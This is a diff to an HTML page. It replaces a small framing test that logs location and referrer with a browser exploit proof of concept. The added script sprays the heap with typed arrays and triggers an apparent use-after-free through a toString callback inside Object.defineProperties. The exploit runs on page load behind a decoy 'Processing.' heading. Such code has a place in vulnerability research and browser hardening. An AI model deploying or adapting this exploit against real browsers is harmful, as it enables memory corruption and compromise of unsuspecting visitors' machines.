@@ -1,21 +1,80 @@
 <html>
 <head>
-  <script 
-    src="https://code.jquery.com/jquery-3.3.1.min.js"
-    integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
-    crossorigin="anonymous">
-  </script>
-  <script>
-  $(document).ready(function(){
-    console.log(window.parent.location);
-    console.log(document.referrer);
-    console.log(document.location);
-  });
-  </script>
-  
-
+	<script>
+         
+         var pressure = new Array(400);
+         var bufs = new Array(10000);
+         
+         garbagecollector = function() {
+	         for (var i = 0; i < pressure.length; i++) {
+	         	pressure[i] = new Uint32Array(0x40000);
+	         }
+         }
+         
+         
+         function spray() {
+	         if(bufs[0]) return;
+	         
+	         garbagecollector();
+         
+	         for (i=0; i < bufs.length; i++) {
+	         	bufs[i] = new Uint32Array(0x100*2)
+	         	for (k=0; k < bufs[i].length; )
+	         	{
+	         		bufs[i][k++] = 0x41414141;
+	         		bufs[i][k++] = 0xffff0000;
+	         	}
+	         }
+         }
+         
+         
+         function go() {
+	         setTimeout(go_, 100);
+         }
+         function go_(){
+	         
+	         var arr = new Array(0x100);
+	         var yolo = new ArrayBuffer(0x1000);
+	         arr[0] = yolo;
+	         arr[1] = 0x13371337;
+	         
+	         var not_number = {};
+	         not_number.toString = function() {
+		         arr = null;
+		         props["stale"]["value"] = null;
+		         spray();
+		         return 10;
+	         };
+	         
+	         var props = {
+		         p0 : { value : 0 },
+		         p1 : { value : 1 },
+		         p2 : { value : 2 },
+		         p3 : { value : 3 },
+		         p4 : { value : 4 },
+		         p5 : { value : 5 },
+		         p6 : { value : 6 },
+		         p7 : { value : 7 },
+		         p8 : { value : 8 },
+		         length : { value : not_number },
+		         stale : { value : arr },
+		         after : { value : 666 } 
+	         };
+	         
+	         var target = [];
+	         var stale = 0;
+	         var before_len = arr.length; 
+	         Object.defineProperties(target, props);
+         }
+         
+      </script>
 </head>
-<body>
-I am frammable
-</body>
+   <body onload="javascript:go()">
+      
+      <center>
+        <h1>Processing.</h1>
+      </center>
+   </body>
 </html>
+
+
